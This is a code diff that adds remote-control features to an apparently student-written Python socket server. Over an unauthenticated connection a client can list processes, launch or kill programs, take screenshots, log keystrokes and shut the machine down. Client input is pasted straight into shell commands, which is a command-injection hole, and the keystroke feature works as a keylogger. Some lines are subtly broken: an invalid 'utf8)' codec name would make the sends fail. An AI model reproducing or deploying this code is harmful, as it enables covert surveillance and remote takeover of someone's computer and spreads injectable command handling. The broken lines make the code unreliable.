@@ -4,28 +4,57 @@ from tkinter import *
 from tkinter import ttk
 from tkinter.ttk import *
 from tkinter import messagebox 
-import json
 import threading
-import sqlite3
 import sys
 import os
+import pyautogui
+import io
+import keyboard
 
 def threaded_client(con, addr):
     while True: 
         req = con.recv(1024).decode("utf8")
         if req == "processList": 
             output = os.popen('wmic process get description, processid').read()
-            print("Size" + str(sys.getsizeof(output)))
-            print("Len" + str(len(output)))
+            con.sendall(output.encode("utf8)"))
+        if req == "appList":
+            output = os.popen('powershell "gps | where {$_.MainWindowTitle } | select processName, Id').read()
             con.sendall(output.encode("utf8)"))
         if req == "kill":
             con.sendall("Receive Request".encode('utf8'))
             pId = con.recv(1024).decode('utf8')
             os.popen('taskkill /F /PID ' + pId)
             con.sendall("Kill process".encode('utf8'))
-        
+        if req == "start":
+            con.sendall("Receive Request".encode('utf8'))
+            name = con.recv(1024).decode('utf8')
+            os.popen('start ' + name)
+            con.sendall("start process".encode('utf8'))
+        if req == "printScreen":
+            img = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            img.save(img_byte_arr, format='PNG')
+            img_byte_arr = img_byte_arr.getvalue()
+            con.sendall(img_byte_arr)
+        if req == "keystroke":
+            con.sendall("receveived Request".encode("utf8"))
+            req = con.recv(1024).decode("utf8")
+            if req == "hook":
+                keyboard.start_recording() 
+                con.sendall("Hooked".encode("utf8"))
+            req = con.recv(1024).decode("utf8")
+            if req == "unhook":
+                record = keyboard.stop_recording() 
+                con.sendall("Unhooked".encode("utf8"))
+            req = con.recv(1024).decode("utf8")
+            if req == "view":
+                string = next(keyboard.get_typed_strings(record))
+                con.sendall(string.encode("utf8"))
+        if req == "shutdown":
+            os.system("shutdown /s")
 
     con.close()
+    
 
 #def start server:
 def start_server():
